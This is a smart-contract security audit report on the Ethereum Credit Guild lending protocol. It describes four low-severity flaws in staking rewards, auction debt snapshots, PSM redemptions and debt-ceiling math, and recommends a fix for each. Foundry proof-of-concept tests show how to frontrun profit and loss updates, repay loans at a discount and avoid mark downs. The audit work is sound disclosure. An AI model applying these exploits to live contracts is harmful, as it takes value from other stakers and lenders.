## Findings Summary

| ID | Description | Severity |
| :-: | - | :-: |
| [L-01](#l-01-users-can-frontrun-notifypnl-calls-to-earn-risk-free-rewards-and-avoid-slashing) | Users can frontrun `NotifyPnL` calls to earn `risk-free` rewards and avoid slashing | Low |
| [L-02](#l-02-auctions-active-during-a-mark-down-allow-borrowers-to-payback-their-loan-at-a-discount-leaking-value-from-the-protocol) | Auctions active during a `mark down` allow borrowers to payback their loan at a discount, leaking value from the protocol | Low |
| [L-03](#l-03-users-can-potentially-avoid-the-effects-of-a-mark-downcreation-of-bad-debt) | Users can potentially avoid the effects of a `mark down`/creation of bad debt | Low |
| [L-04](#l-04-debtceiling-does-not-properly-calculate-the-debt-ceiling-of-gauges-experiencing-an-adjustment-up) | `debtCeiling()` does not properly calculate the debt ceiling of gauges experiencing an adjustment up | Low |

## [L-01] Users can frontrun `NotifyPnL` calls to earn `risk-free` rewards and avoid slashing

### Bug Description
Calls to `ProfitManager::notifyPnL` are performed by terms when a profit or loss is generated. Guild stakers who are staked into a gauge while it experiences a profit will be eligible to claim rewards for that gauge/term. First, the gauge's `gaugeProfitIndex` is updated based on the profit generated:

[ProfitManager::notifyPnL#L383-L399](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/ProfitManager.sol#L383-L399)

```solidity
383:            if (amountForGuild != 0) {
384:                // update the gauge profit index
385:                // if the gauge has 0 weight, does not update the profit index, this is unnecessary
386:                // because the profit index is used to reattribute profit to users voting for the gauge,
387:                // and if the weigth is 0, there are no users voting for the gauge.
388:                uint256 _gaugeWeight = uint256(
389:                    GuildToken(guild).getGaugeWeight(gauge)
390:                );
391:                if (_gaugeWeight != 0) {
392:                    uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];
393:                    if (_gaugeProfitIndex == 0) {
394:                        _gaugeProfitIndex = 1e18;
395:                    }
396:                    gaugeProfitIndex[gauge] =
397:                        _gaugeProfitIndex +
398:                        (amountForGuild * 1e18) /
399:                        _gaugeWeight;
```

Next, stakers who were staked in the gauge will be able to collect the rewards via `ProfitManager::claimGaugeRewards`:

[ProfitManager::claimGaugeRewards#L427-L434](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/ProfitManager.sol#L427-L434)
```solidity
427:        uint256 deltaIndex = _gaugeProfitIndex - _userGaugeProfitIndex;
428:        if (deltaIndex != 0) {
429:            creditEarned = (_userGaugeWeight * deltaIndex) / 1e18;
430:            userGaugeProfitIndex[user][gauge] = _gaugeProfitIndex;
431:        }
432:        if (creditEarned != 0) {
433:            emit ClaimRewards(block.timestamp, user, gauge, creditEarned);
434:            CreditToken(credit).transfer(user, creditEarned);
```

On the other hand, stakers who are staked into a gauge when it experiences a loss will have their Guild slashed. First, the time of the loss is recorded in the gauge: 

[ProfitManager::notifyPnL#L300-L305](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/ProfitManager.sol#L300-L305)
```solidity
300:        // handling loss
301:        if (amount < 0) {
302:            uint256 loss = uint256(-amount);
303:
304:            // save gauge loss
305:            GuildToken(guild).notifyGaugeLoss(gauge);
```

Next, the loss can be applied to any staker who was staked into the gauge when the loss occured, resulting in the staker being slashed:

[GuildToken::applyGaugeLoss#L133-L140](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/tokens/GuildToken.sol#L133-L140)

```solidity
133:    function applyGaugeLoss(address gauge, address who) external {
134:        // check preconditions
135:        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];
136:        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][who];
137:        require(
138:            _lastGaugeLoss != 0 && _lastGaugeLossApplied < _lastGaugeLoss,
139:            "GuildToken: no loss to apply"
140:        );
```

User's are not enforced to be staked into a gauge for a minimum amount of time in order to be eligible to receive rewards and therefore a user can stake into the gauge immediately before a profit is generated (in the same block) and then claim rewards via `claimGaugeRewards`. 

Similarly, stakers can avoid being slashed by immediately unstaking all their Guild before the loss is recorded (in the same block). Therefore, the user's `lastGaugeLossApplied` will be equal to the `lastGaugeLoss` and the user will not be slashed. 

### Impact
Users can frontrun `gainy notifyPnL` calls to collect rewards for a gauge that will experience a profit. This will result in all other stakers' rewards being diluted. The user is able to do this despite their total time staked in the gauge being `0` (staked into gauge during the same block as profit). Additionally, the user is able to benefit from the reward system while taking on `zero-risk`. 

Users can frontrun `lossy notifyPnL` calls to avoid being slashed. Since slashing is total, a loss of `1 wei` will be as devastating to a staker as a loss of `1_000e18`. Therefore, users are incentivized to actively try to avoid these losses by unstaking all of their Guild immediately before the gauge experiences a loss. Note that in a single gauge system all the Guild, except for `1 wei`, is able to be unstaked without complications (assuming the `issuance` is not at the `debt ceiling`). However, for multi-gauge systems, user's who unstake will have to be sure the adjusted debt ceiling (after unstaking) does not fall below the `issuance` for the gauge, or else the user will not be allowed to unstake their Guild.  

### Proof of Concept

Place the following test inside of `/test/unit/governance/ProfitManager.t.sol`:

```solidity
    function testFrontrunGainyAndLossyNotifyPnL() public {
        // grant roles to test contract
        vm.startPrank(governor);
        core.grantRole(CoreRoles.GOVERNOR, address(this));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        vm.stopPrank();

        // setup
        // 100% of profit goes to Guild stakers
        vm.prank(governor);
        profitManager.setProfitSharingConfig(
            0, // surplusBufferSplit
            0, // creditSplit
            1e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        // set up gauge 
        guild.setMaxGauges(1);
        guild.addGauge(1, gauge1);

        // alice and bob both have Guild
        guild.mint(alice, 50e18);
        guild.mint(bob, 50e18);

        // alice is staked into the gauge
        vm.startPrank(alice);
        guild.incrementGauge(gauge1, 50e18);
        vm.stopPrank();

        assertEq(guild.getUserWeight(alice), 50e18);
        assertEq(guild.getUserWeight(bob), 0);

        // time passes since alice was staked in the gauge
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + (100 * 13));

        // bob stakes into the gauge immediately before the gauge experiences a profit
        vm.startPrank(bob);
        guild.incrementGauge(gauge1, 50e18);
        vm.stopPrank();

        assertEq(guild.getUserWeight(bob), 50e18);
        assertEq(guild.getUserWeight(alice), 50e18);

        credit.mint(address(profitManager), 200e18);
        profitManager.notifyPnL(gauge1, 200e18);

        // bob and alice both claim equal rewards
        assertEq(profitManager.claimRewards(alice), 100e18);
        assertEq(profitManager.claimRewards(bob), 100e18);
        assertEq(credit.balanceOf(address(profitManager)), 0);

        // alice and bob are both staked in the gauge
        assertEq(guild.getUserWeight(bob), 50e18);
        assertEq(guild.getUserWeight(alice), 50e18);

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 13);

        // bob unstakes from the gauge immediately before the gauge experiences a loss
        vm.startPrank(bob);
        guild.decrementGauge(gauge1, 50e18);
        vm.stopPrank();

        profitManager.notifyPnL(gauge1, -1e18);

        // alice's loss is applied and she is slashed
        guild.applyGaugeLoss(gauge1, alice);

        assertEq(guild.getUserWeight(alice), 0);
        assertEq(guild.balanceOf(alice), 0);

        // bob can not be slashed
        vm.expectRevert();
        guild.applyGaugeLoss(gauge1, bob);

        assertEq(guild.getUserWeight(bob), 0);
        assertEq(guild.balanceOf(bob), 50e18);
    }
```

### Recommendation
Stakers can be enforced to be staked into a gauge for at least 1 block. This would ensure that user's are not able to stake into a gauge in the same block in which a profit is generated and collect rewards. 

Unstaking can be restricted during auctions in order to prevent stakers from speculating on the likely-hood of a `loss` occuring and prevent them from unstaking before the loss is recorded. 

## [L-02] Auctions active during a `mark down` allow borrowers to payback their loan at a discount, leaking value from the protocol

### Bug Description
A loan's debt during auction represents a `snapshot` of the debt at a previous `creditMultiplier` value:

[LendingTerm::_call#L664-L667](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L664-L667)
```solidity
664:        // update loan in state
665:        uint256 loanDebt = getLoanDebt(loanId);
666:        loans[loanId].callTime = block.timestamp;
667:        loans[loanId].callDebt = loanDebt;
```

As seen above, line 665 performs a call to `getLoanDebt`, which retrieve's the loan's current debt with respect to the current `creditMultiplier`:

[LendingTerm::getLoanDebt#L228-L230](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L228-L230)
```solidity
 228:       uint256 creditMultiplier = ProfitManager(refs.profitManager)
 229:           .creditMultiplier();
 230:       loanDebt = (loanDebt * loan.borrowCreditMultiplier) / creditMultiplier;
```

However, during auction the debt is compared against an updated `principle`, which takes into consideration an updated `creditMultiplier`:

[LendingTerm::onBid#L751-L762](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L751-L762)
```solidity
751:        uint256 creditMultiplier = ProfitManager(refs.profitManager)
752:            .creditMultiplier();
753:        uint256 borrowAmount = loans[loanId].borrowAmount;
754:        uint256 principal = (borrowAmount *
755:            loans[loanId].borrowCreditMultiplier) / creditMultiplier;
756:        int256 pnl;
757:        uint256 interest;
758:        if (creditFromBidder >= principal) {
759:            interest = creditFromBidder - principal;
760:            pnl = int256(interest);
761:        } else {
762:            pnl = int256(creditFromBidder) - int256(principal);
```

Note that in the above code, `creditFromBidder` is `<= callDebt`, depending on when the bid takes place. If the `creditMultiplier` is updated when the loan is in auction, then the `callDebt` of the loan will be less than what the loan should actually be (considering the updated `creditMultiplier`). This allows the borrower to bid during the first phase of the auction and receive their original collateral at a discount. In addition, because the `callDebt` (`creditFromBidder`) stays the same while the `principle` increases, then the difference (`interest`) will be less that it should be (considering the updated `creditMultiplier`). 

### Impact
When a borrower's loan is in auction during a `mark down`, the borrower is able to repay their loan, and receive their collateral, at a discount. This results in the protocol collecting *less* interest from the borrower. The difference between the `interestExpected` and the `interestReceived` is leaked from the protocol. 

### Proof of Concept

Place the following test inside of the `/test/unit/loan/` directory:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.13;

import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

import {Test} from "@forge-std/Test.sol";
import {Core} from "@src/core/Core.sol";
import {CoreRoles} from "@src/core/CoreRoles.sol";
import {MockERC20} from "@test/mock/MockERC20.sol";
import {SimplePSM} from "@src/loan/SimplePSM.sol";
import {GuildToken} from "@src/tokens/GuildToken.sol";
import {CreditToken} from "@src/tokens/CreditToken.sol";
import {LendingTerm} from "@src/loan/LendingTerm.sol";
import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
import {ProfitManager} from "@src/governance/ProfitManager.sol";
import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";

contract ReceiveCollatAtDiscount is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address borrower = address(0x02020202);
    address borrower2 = address(0x03030303);
    Core private core;
    ProfitManager private profitManager;
    CreditToken credit;
    GuildToken guild;
    MockERC20 collateral;
    MockERC20 USDC;
    SimplePSM private psm;
    RateLimitedMinter rlcm;
    AuctionHouse auctionHouse;
    LendingTerm term;

    uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
    uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
    uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0;
    uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0;
    uint256 constant _HARDCAP = 2_000_000e18; // 2 million

    uint256 public issuance = 0;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManager = new ProfitManager(address(core));
        collateral = new MockERC20();
        USDC = new MockERC20(); // 18 decimals for easy calculations 
        credit = new CreditToken(address(core), "name", "symbol");
        guild = new GuildToken(
            address(core),
            address(profitManager)
        );
        rlcm = new RateLimitedMinter(
            address(core) /*_core*/,
            address(credit) /*_token*/,
            CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
            0 /*_maxRateLimitPerSecond*/,
            0 /*_rateLimitPerSecond*/,
            uint128(_HARDCAP) /*_bufferCap*/
        );
        auctionHouse = new AuctionHouse(address(core), 650, 1800);
        term = LendingTerm(Clones.clone(address(new LendingTerm())));
        term.initialize(
            address(core),
            LendingTerm.LendingTermReferences({
                profitManager: address(profitManager),
                guildToken: address(guild),
                auctionHouse: address(auctionHouse),
                creditMinter: address(rlcm),
                creditToken: address(credit)
            }),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: _INTEREST_RATE,
                maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        psm = new SimplePSM(
            address(core),
            address(profitManager),
            address(credit),
            address(USDC)
        );
        profitManager.initializeReferences(address(credit), address(guild), address(psm));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
        core.grantRole(CoreRoles.CREDIT_REBASE_PARAMETERS, address(psm));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        // add gauge 
        guild.setMaxGauges(10);
        guild.addGauge(1, address(term));
    }

    function testReceiveCollateralAtDiscountAndLeakValue() public {
        // setup
        // 100% of profit goes to surplus buffer
        vm.prank(governor);
        profitManager.setProfitSharingConfig(
            1e18, // surplusBufferSplit
            0, // creditSplit
            0, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        // debt ceiling for term is increased
        guild.mint(address(this), 1);
        guild.incrementGauge(address(term), 1);

        // borrower1 takes out loan for 1_000e18 Credit
        collateral.mint(borrower, 1_000e18);
        vm.startPrank(borrower);
        collateral.approve(address(term), 1_000e18);
        bytes32 loanId1 = term.borrow(1_000e18, 1_000e18);
        vm.stopPrank();

        // borrower2 takes out a loan for 1_000e18 Credit
        collateral.mint(borrower2, 1_000e18);
        vm.startPrank(borrower2);
        collateral.approve(address(term), 1_000e18);
        bytes32 loanId2 = term.borrow(1_000e18, 1_000e18);
        vm.stopPrank();

        // 1 year passes and both borrowers owe the same principle + interest
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + term.YEAR());

        assertEq(term.getLoanDebt(loanId1), 1_040e18);
        assertEq(term.getLoanDebt(loanId2), 1_040e18);

        // term is offboarded
        guild.removeGauge(address(term));
        assertEq(guild.isGauge(address(term)), false);

        // borrower1's loan is called
        term.call(loanId1);
        assertEq(term.getLoan(loanId1).callTime, block.timestamp);

        // borrowers still owe the same for their loans
        assertEq(term.getLoanDebt(loanId1), 1_040e18);
        assertEq(term.getLoanDebt(loanId2), 1_040e18);

        // bad debt is created/Credit is marked down while both loans are in auction
        vm.prank(address(term));
        profitManager.notifyPnL(address(term), -40e18);

        assertEq(profitManager.creditMultiplier(), 0.98e18);

        // borrower2 now owes more than borrower1, due to the markdown
        assertEq(term.getLoanDebt(loanId1), 1_040e18); // 1_040
        assertEq(term.getLoanDebt(loanId2), 1061224489795918367346); // ~ 1_061.2

        // borrower1 bids during the first phase of their auction and receives their collateral at a discount
        assertEq(collateral.balanceOf(borrower), 0); // borrower has 0 collateral to start
        assertEq(credit.balanceOf(address(profitManager)), 0); // profitManager has received 0 interest

        uint256 collateralExpected = term.getLoan(loanId1).collateralAmount;
        
        credit.mint(borrower, 40e18);
        vm.startPrank(borrower);
        credit.approve(address(term), 1_040e18);
        auctionHouse.bid(loanId1);
        vm.stopPrank();

        uint256 collateralReceived = collateral.balanceOf(borrower);
        assertEq(collateralExpected, collateralReceived);

        // interest received by the protocol for borrower1's loan
        // expected interest is 40e18 (4% of original 1_000 loan)
        uint256 interestReceivedLoan1 = credit.balanceOf(address(profitManager));

        assertEq(interestReceivedLoan1, 19591836734693877552); // ~ 19.59e18, i.e. NOT 40e18

        // borrower2 repays his loan before it is called and pays the correct amount of inflated Credit
        assertEq(collateral.balanceOf(borrower2), 0); // borrower2 has 0 collateral to start
        assertEq(credit.balanceOf(address(profitManager)), 19591836734693877552); // profitManager interest received so far

        collateralExpected = term.getLoan(loanId2).collateralAmount;
        
        credit.mint(borrower2, 61224489795918367346);
        vm.startPrank(borrower2);
        credit.approve(address(term), 1061224489795918367346);
        term.repay(loanId2);
        vm.stopPrank();

        collateralReceived = collateral.balanceOf(borrower);
        assertEq(collateralExpected, collateralReceived);

        // interest received by protocol for borrower2's loan
        uint256 interestReceivedLoan2 = credit.balanceOf(address(profitManager));
        
        assertEq(interestReceivedLoan2, 60408163265306122450); // ~ 60e18 due to mark down

        // interest received from borrower1's loan is less than what is received from borrower2's loan
        assertLt(interestReceivedLoan1, interestReceivedLoan2);

        // Note: borrower1 paid less Credit for their full collateral than borrower2
        // the protocol received less interest from borrower1's loan than from borrower2's loan
    }
}
```

### Recommendation
The `callDebt` for a loan should be calculated dynamically during an auction, with consideration of the current `creditMultiplier`. 

## [L-03] Users can potentially avoid the effects of a `mark down`/creation of bad debt

### Bug Description
When the protocol accrues bad debt during a loss the `creditMultipliter` will be `marked down`:

[ProfitManager::notifyPnL#L330-L334](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/ProfitManager.sol#L330-L334)
```solidity
330:                // update the CREDIT multiplier
331:                uint256 creditTotalSupply = CreditToken(_credit).totalSupply();
332:                uint256 newCreditMultiplier = (creditMultiplier *
333:                    (creditTotalSupply - loss)) / creditTotalSupply;
334:                creditMultiplier = newCreditMultiplier;
```

This will have the effect of decreasing the value of all the `Credit` flowing through the system, meaning everyone in the system who holds `Credit` will experience inflation. This is to ensure that the protocol is able to properly handle bad debt and mitigate against `bank run` scenarios in which only the first withdrawers will be able to extract their funds after bad debt is accrued. This `inflation` of `Credit` is enforced in the `SimplePSM`, where user's are able to exchange their `Credit` for a `pegToken`:

[SimplePSM::getRedeemAmountOut#L86-L93](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/SimplePSM.sol#L86-L93)
```solidity
86:    /// @notice calculate the amount of underlying out for a given `amountIn` of CREDIT
87:    function getRedeemAmountOut(
88:        uint256 amountIn
89:    ) public view returns (uint256) {
90:        uint256 creditMultiplier = ProfitManager(profitManager)
91:            .creditMultiplier();
92:        return (amountIn * creditMultiplier) / 1e18 / decimalCorrection;
93:    }
```

As we can see above, the amount of `pegToken` a user can receive with `amountIn` of `Credit` will decrease as the `creditMultiplier` decreases. This decrease in the `creditMultiplier` is the result of a `mark down`. 

A `mark down` can occur after a loan is called. Once the loan is called an auction for the collateral begins and if no one bids in this auction, then the protocol is at risk for creating bad debt and thus a `mark down`. A loan can be called if either the borrower has missed a required `periodic payment` or if the term has been offboarded:

[LendingTerm::_call#L651-L656](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L651-L656)
```solidity
651:        // check that the loan can be called
652:        require(
653:            GuildToken(refs.guildToken).isDeprecatedGauge(address(this)) ||
654:                partialRepayDelayPassed(loanId),
655:            "LendingTerm: cannot call"
656:        );
```

When a loan is called under the condition that the term has been offboarded, redemptions in the PSM will be paused:

[LendingTermOffboarding::offboard#L161-L167](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/LendingTermOffboarding.sol#L161-L167)
```solidity
161:        // pause psm redemptions
162:        if (
163:            nOffboardingsInProgress++ == 0 &&
164:            !SimplePSM(psm).redemptionsPaused()
165:        ) {
166:            SimplePSM(psm).setRedemptionsPaused(true);
167:        }
```

This will dis-allow users from using their `Credit` to redeem the `pegToken` via the PSM. However, this does not occur for auctions that begin under the condition that the borrower has missed a `periodic payment`. Therefore, when `periodic payments` are required, it is possible for redemptions to be active while an auction is taking place. If the auction results in a `mark down` (worse case scenario), a user will be able to front run the `lossy notifyPnL` call and redeem `pegToken` in the PSM with all of their `Credit`. After the `mark down` has occured the user can then exchange their `pegToken` for the appropriate `Credit` via the PSM. Their dollar value of `Credit` remains the same. 

### Impact
For terms which require `periodic payments`, redemptions in the PSM are not required to be paused during live aucitons. This allows a user to potentially maintain the dollar value of their `Credit` position during a `mark down` while everyone else in the system experiences inflation. 

### Proof of Concept

Place the following test inside of the `/test/unit/loan/` directory:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.13;

import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

import {Test} from "@forge-std/Test.sol";
import {Core} from "@src/core/Core.sol";
import {CoreRoles} from "@src/core/CoreRoles.sol";
import {MockERC20} from "@test/mock/MockERC20.sol";
import {SimplePSM} from "@src/loan/SimplePSM.sol";
import {GuildToken} from "@src/tokens/GuildToken.sol";
import {CreditToken} from "@src/tokens/CreditToken.sol";
import {LendingTerm} from "@src/loan/LendingTerm.sol";
import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
import {ProfitManager} from "@src/governance/ProfitManager.sol";
import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";

contract AvoidMarkdown is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address user = address(0x01010101);
    address borrower = address(0x03030303);
    Core private core;
    ProfitManager private profitManager;
    CreditToken credit;
    GuildToken guild;
    MockERC20 collateral;
    MockERC20 USDC;
    SimplePSM private psm;
    RateLimitedMinter rlcm;
    AuctionHouse auctionHouse;
    LendingTerm term;

    uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
    uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
    uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 31557600; // 1 year
    uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0.2e18; // 20%
    uint256 constant _HARDCAP = 2_000_000e18; // 2 million

    uint256 public issuance = 0;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManager = new ProfitManager(address(core));
        collateral = new MockERC20();
        USDC = new MockERC20(); // 18 decimals for easy calculations 
        credit = new CreditToken(address(core), "name", "symbol");
        guild = new GuildToken(
            address(core),
            address(profitManager)
        );
        rlcm = new RateLimitedMinter(
            address(core) /*_core*/,
            address(credit) /*_token*/,
            CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
            0 /*_maxRateLimitPerSecond*/,
            0 /*_rateLimitPerSecond*/,
            uint128(_HARDCAP) /*_bufferCap*/
        );
        auctionHouse = new AuctionHouse(address(core), 650, 1800);
        term = LendingTerm(Clones.clone(address(new LendingTerm())));
        term.initialize(
            address(core),
            LendingTerm.LendingTermReferences({
                profitManager: address(profitManager),
                guildToken: address(guild),
                auctionHouse: address(auctionHouse),
                creditMinter: address(rlcm),
                creditToken: address(credit)
            }),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: _INTEREST_RATE,
                maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        psm = new SimplePSM(
            address(core),
            address(profitManager),
            address(credit),
            address(USDC)
        );
        profitManager.initializeReferences(address(credit), address(guild), address(psm));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
        core.grantRole(CoreRoles.CREDIT_REBASE_PARAMETERS, address(psm));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        // add gauge 
        guild.setMaxGauges(10);
        guild.addGauge(1, address(term));
    }

    function testUserAvoidsMarkdownEffect() public {
        // debt ceiling for term is increased
        guild.mint(address(this), 1);
        guild.incrementGauge(address(term), 1);

        // PSM has 100_000e18 USDC
        USDC.mint(address(this), 80_000e18);
        USDC.approve(address(psm), 80_000e18);
        psm.mint(address(this), 80_000e18);

        assertEq(psm.redeemableCredit(), 80_000e18);

        // user has 1000 Credit, currently worth 1000 USDC
        credit.mint(user, 1000e18);
        assertEq(credit.balanceOf(user), 1000e18);
        assertEq(psm.getRedeemAmountOut(1000e18), 1000e18); // 1000 credit == 1000 USDC

        // borrower takes out a loan from term
        collateral.mint(borrower, 1000e18);
        vm.startPrank(borrower);
        collateral.approve(address(term), 1000e18);
        bytes32 loanId = term.borrow(1000e18, 1000e18);
        vm.stopPrank();

        // borrower misses partial payment and the loan is called (redeems not paused in this case)
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + term.YEAR() + 1);

        term.call(loanId);

        // no one bids in auction (worse case scenario) and loan needs to be forgiven (bad debt created)
        vm.warp(block.timestamp + auctionHouse.auctionDuration());
        (, uint256 creditAsked) = auctionHouse.getBidDetail(loanId); 
        assertEq(creditAsked, 0); // phase 2 ended

        // user front runs the `forgive` call and redeems USDC with his Credit
        vm.startPrank(user);
        credit.approve(address(psm), 1000e18);
        psm.redeem(user, 1000e18);
        vm.stopPrank();

        assertEq(credit.balanceOf(user), 0);
        assertEq(USDC.balanceOf(user), 1000e18);

        // `forgive` function is called and credit is marked down
        auctionHouse.forgive(loanId);
        assertEq(profitManager.creditMultiplier(), 987654320987654320); // credit marked down


        // user back runs `forgive` and mints Credit with 1000 USDC
        vm.startPrank(user);
        USDC.approve(address(psm), 1000e18);
        psm.mint(user, 1000e18);
        vm.stopPrank();

        assertEq(USDC.balanceOf(user), 0);
        assertEq(credit.balanceOf(user), 1012500000000000001012); // ~1_012.5 Credit

        // user now has x Credit, valued at 1000 USDC
        assertEq(psm.getRedeemAmountOut(1012500000000000001012), 999999999999999999999); // ~1012.5 credit == ~999.99 | due to rounding

        // Note: user maintained dollar value of Credit while everyone else experienced inflation for their Credit
    }
```

### Recommendation
In order to ensure that redemptions are paused during all auctions I would recommend to also pause redemptions when a loan is being called due to a missed `periodic payment`. 

## [L-04] `debtCeiling()` does not properly calculate the debt ceiling of gauges experiencing an adjustment up

### Bug Description
The `debtCeiling` function will return a gauge's debt allocation, with respect to an applied adjustment (gauge is being staked into or unstaked from):

[LendingTerm::debtCeiling#L270-L281](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L270-L281)
```solidity
270:    function debtCeiling(
271:        int256 gaugeWeightDelta
272:    ) public view returns (uint256) {
273:        address _guildToken = refs.guildToken; // cached SLOAD
274:        uint256 gaugeWeight = GuildToken(_guildToken).getGaugeWeight(
275:            address(this)
276:        );
277:        gaugeWeight = uint256(int256(gaugeWeight) + gaugeWeightDelta);
278:        uint256 gaugeType = GuildToken(_guildToken).gaugeType(address(this));
279:        uint256 totalWeight = GuildToken(_guildToken).totalTypeWeight(
280:            gaugeType
281:        );
```

As seen above, the `gaugeWeightDelta` is the adjustment being applied to the `gaugeWeight` of the gauge. If the adjusted `gaugeWeight` is 0, then the debt ceiling is considered 0. If the `gaugeWeight` is equal to the `totalWeight` for all the gauge's of this type, then the gauge is considered to have 100% debt allocation:

[LendingTerm::debtCeiling#L285-L292](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L285-L292)
```solidity
285:        if (gaugeWeight == 0) {
286:            return 0; // no gauge vote, 0 debt ceiling
287:        } else if (gaugeWeight == totalWeight) {
288:            // one gauge, unlimited debt ceiling
289:            // returns min(hardCap, creditMinterBuffer)
290:            return
291:                _hardCap < creditMinterBuffer ? _hardCap : creditMinterBuffer;
292:        }
```

However, as we can see in the above code snippets, the adjusted `totalWeight` for the gauge type is not considered. This can result in a gauge being adjusted up by a `gaugeWeightDelta` that results in the adjusted `gaugeWeight` being equal to the non-adjusted `totalWeight`. If this gauge is in a multi-gauge system then it's calculated debt allocation will be considered 100%, despite the weight of other gauges in the system. Lets consider an example:

```
- totalWeight = 2000e18
- Gauge A weight =  1000e18 => 50% debt allocation
- Gauge B weight = 1000e18 => 50% debt allocation

- gaugeA.debtCeiling(1000e18):
- gaugeWeightDelta = 1000e18
- gaugeWeight = gaugeAWeight + gaugeWeightDelta = 2000e18
- gaugeWeight == totalWeight => 100% debt allocation

Actual debt allocations after adjustment:
- totalWeight (post adjustment) = 3000e18
- Gauge A weight (post adjustment) = 2000e18
- Gauge B weight = 1000e18

- Gauge A debt allocation = 2000e18 / 3000e18 => ~ 66%
- Gauge B debt allocation = 1000e18 / 3000e18 => ~ 33%
```

As we can see above, the `debtCeiling` function will not return the proper debt ceiling of a gauge when the gauge is being adjusted up with an amount that results in the `gaugeWeight` being equal to the `totalWeight`. 

